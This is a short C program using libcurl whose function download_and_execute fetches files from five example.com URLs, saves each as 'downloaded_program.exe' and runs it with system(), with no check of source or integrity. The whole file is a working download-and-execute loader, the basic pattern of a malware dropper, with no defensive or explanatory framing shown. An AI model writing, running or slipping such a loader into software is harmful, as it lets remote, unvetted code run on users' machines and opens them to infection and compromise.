#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

void download_and_execute(const char *fileURL) {
    const char *fileName = "downloaded_program.exe";
    CURL *curl;
    FILE *fp;
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(fileName, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, fileURL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
        char command[256];
        snprintf(command, sizeof(command), ".\\%s", fileName);
        system(command);
    }
}

int main() {
    const char *testUrls[] = {
        "http://example.com/program1.exe",
        "http://example.com/program2.exe",
        "http://example.com/program3.exe",
        "http://example.com/program4.exe",
        "http://example.com/program5.exe"
    };
    
    for (int i = 0; i < 5; i++) {
        download_and_execute(testUrls[i]);
    }
    return 0;
}